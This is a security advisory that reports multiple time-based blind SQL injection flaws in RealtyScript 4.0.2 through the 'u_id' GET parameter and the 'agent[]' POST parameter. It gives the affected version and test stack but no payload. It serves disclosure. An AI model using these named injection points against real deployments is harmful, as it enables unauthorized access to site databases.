RealtyScript v4.0.2 Multiple Time-based Blind SQL Injection Vulnerabilities


Vendor: Next Click Ventures
Product web page: http://www.realtyscript.com
Affected version: 4.0.2

Summary: RealtyScript is award-winning real estate software that makes
it effortless for a real estate agent, office, or entrepreneur to be
up and running with a real estate web site in minutes. The software
is in daily use on thousands of domain names in over 40 countries and
has been translated into over 25 languages.

Desc: RealtyScript suffers from multiple SQL Injection vulnerabilities.
Input passed via the GET parameter 'u_id' and the POST parameter 'agent[]'
is not properly sanitised before being returned to the user or used in
SQL queries. This can be exploited to manipulate SQL queries by injecting
arbitrary SQL code.

Tested on: Apache/2.4.6 (CentOS)
           PHP/5.4.16
           MariaDB-5.5.41
